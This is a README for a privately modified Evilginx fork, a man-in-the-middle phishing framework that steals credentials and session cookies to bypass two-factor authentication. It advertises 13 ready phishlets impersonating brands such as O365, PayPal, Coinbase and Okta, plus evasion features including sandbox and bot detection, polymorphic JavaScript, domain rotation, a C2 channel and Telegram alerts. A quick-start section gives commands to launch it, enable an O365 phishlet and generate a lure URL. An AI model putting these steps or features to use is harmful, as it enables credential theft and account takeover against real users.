<p align="center">
  <img alt="Evilginx2 Logo" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png" height="160" />
  <p align="center">
    <img alt="Evilginx2 Title" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-title-black-512.png" height="60" />
  </p>
</p>

# Evilginx 3.3.1 - Private Dev Edition

**Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.

This **Private Development Edition** includes advanced evasion, detection, and operational features not available in the standard release.

**Modified by:** AKaZA (Akz0fuku)  
**Original Author:** Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky))  
**Version:** 3.3.1 - Private Dev Edition

## ✅ Latest Updates (Nov 2025)

**All Systems Validated:**
- ✅ **13 Phishlets Debugged** - Fixed `force_post` fields in all auth_tokens sections
- ✅ **13 Turnstile Redirectors** - Complete Cloudflare CAPTCHA integration for all phishlets
- ✅ **Perfect 1:1 Mapping** - Every phishlet has a matching Turnstile redirector
- ✅ **Build Tested** - Compiles successfully with Go 1.25.1
- ✅ **Clean Structure** - Orphaned redirectors removed, optimized directory layout

**Included Phishlets:**
Amazon, Apple, Booking, Coinbase, Facebook, Instagram, LinkedIn, Netflix, O365, Okta, PayPal, Salesforce, Spotify

**Turnstile Redirectors:**
All phishlets include professional Cloudflare Turnstile verification pages with browser compatibility files.

<p align="center">
  <img alt="Screenshot" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png" height="320" />
</p>

## 🚨 Disclaimer

This tool is designed for **AUTHORIZED PENETRATION TESTING AND RED TEAM ENGAGEMENTS ONLY**. Unauthorized use of this tool is illegal and unethical. The authors and contributors are not responsible for misuse or damage caused by this tool.

**Legal Requirements:**
- Written authorization from target organization
- Defined scope of engagement
- Compliance with local laws and regulations
- Proper data handling and destruction protocols

Evilginx should be used only in legitimate penetration testing assignments with written permission from to-be-phished parties.

---

## 🚀 What's New in Private Dev Edition

This private development edition extends the standard Evilginx 3.3 with enterprise-grade features for advanced red team operations:

✅ **Machine Learning Bot Detection** - AI-powered detection evasion  
✅ **JA3/JA3S Fingerprinting** - TLS fingerprint analysis and blocking  
✅ **Sandbox Detection** - VM and analysis tool detection  
✅ **Polymorphic JavaScript Engine** - Dynamic code mutation  
✅ **Domain Rotation** - Automated domain switching  
✅ **Traffic Shaping** - Adaptive rate limiting and DDoS protection  
✅ **C2 Channel** - Encrypted command and control  
✅ **TLS Interception** - Advanced certificate management  
✅ **Cloudflare Worker Integration** - Proxy bypass capabilities  
✅ **Enhanced Telegram Integration** - Real-time notifications  
✅ **Advanced Obfuscation** - Multi-layer code obfuscation

---

## ⚡ Quick Start

For comprehensive instructions on installation, detailed configuration, enterprise features, and troubleshooting, please refer to the **[Deployment & Operational Guide](DEPLOYMENT.md)**.

### Brief Setup Guide

1.  **Install**:
    - **Linux**: Run `sudo ./install.sh` for an automated setup.
    - **Windows**: Run `.\install-windows.ps1` in PowerShell as Admin.
    - **Manual**: Build with `make` or `go build`.

2.  **Start**:
    ```bash
    sudo ./build/evilginx -p ./phishlets -t ./redirectors
    ```

3.  **Configure**:
    ```bash
    config domain yourdomain.com
    config ipv4 your.vps.ip
    ```

4.  **Deploy**:
    ```bash
    phishlets enable o365
    lures create o365
    lures edit 0 redirector o365_turnstile
    lures get-url 0
    ```

**👉 [Click here for the complete DEPLOYMENT.md guide](DEPLOYMENT.md)**

---

## 📋 Feature Comparison

| Feature | Standard 3.3 | Private Dev Edition |
|---------|--------------|---------------------|
| Basic MITM Proxy | ✅ | ✅ |
| 2FA Bypass | ✅ | ✅ |
| Phishlet System | ✅ | ✅ |
| Gophish Integration | ✅ | ✅ |
| **Turnstile Redirectors** | ❌ | ✅ (13 pre-built) |
| **Debugged Phishlets** | ❌ | ✅ (13 validated) |
| **ML Bot Detection** | ❌ | ✅ |
| **JA3 Fingerprinting** | ❌ | ✅ |
| **Sandbox Detection** | ❌ | ✅ |
| **Polymorphic Engine** | ❌ | ✅ |
| **Domain Rotation** | ❌ | ✅ |
| **Traffic Shaping** | ❌ | ✅ |
| **C2 Channel** | ❌ | ✅ |
| **Advanced Obfuscation** | ❌ | ✅ |
| **Cloudflare Workers** | ❌ | ✅ |
| **Enhanced Telegram** | ❌ | ✅ |

### Phishlet Status

| Phishlet | Status | Turnstile Redirector | Auth Tokens Fixed |
|----------|--------|---------------------|-------------------|
| Amazon | ✅ Ready | ✅ Complete | ✅ force_post added |
| Apple | ✅ Ready | ✅ Complete | ✅ force_post added |
| Booking | ✅ Ready | ✅ Complete | ✅ force_post added |
| Coinbase | ✅ Ready | ✅ Complete | ✅ force_post added |
| Facebook | ✅ Ready | ✅ Complete | ✅ force_post added |
| Instagram | ✅ Ready | ✅ Complete | ✅ force_post added |
| LinkedIn | ✅ Ready | ✅ Complete | ✅ force_post added |
| Netflix | ✅ Ready | ✅ Complete | ✅ force_post added |
| O365 | ✅ Ready | ✅ Complete | ✅ Already correct |
| Okta | ✅ Ready | ✅ Complete | ✅ Fixed + wildcard domains |
| PayPal | ✅ Ready | ✅ Complete | ✅ force_post added |
| Salesforce | ✅ Ready | ✅ Complete | ✅ force_post added |
| Spotify | ✅ Ready | ✅ Complete | ✅ force_post added |

---

## 📚 Official Resources

- **Original Documentation**: https://help.evilginx.com
- **Blog**: https://breakdev.org
- **Training**: [Evilginx Mastery Course](https://academy.breakdev.org/evilginx-mastery)
- **Gophish Integration**: https://github.com/kgretzky/gophish/

---

## 🤝 Contributing

This is a private development fork. For the original project:
- **Original Repository**: https://github.com/kgretzky/evilginx2
- **Original Author**: Kuba Gretzky ([@mrgretzky](https://twitter.com/mrgretzky))

---

## 📄 License & Legal

**BSD-3 Clause License** - Copyright (c) 2018-2023 Kuba Gretzky. All rights reserved.  
Private modifications by AKaZA (Akz0fuku).

**This tool is provided for educational and authorized testing purposes only.**
By using this software, you agree to:
- Only use it with explicit written authorization
- Comply with all applicable laws and regulations
- Accept full responsibility for your actions

**Unauthorized access to computer systems is illegal.** Use responsibly.

---

## 📞 Support

**For this private edition:**
- Review **[DEPLOYMENT.md](DEPLOYMENT.md)** for setup help and troubleshooting.
- Enable debug mode for detailed logs.
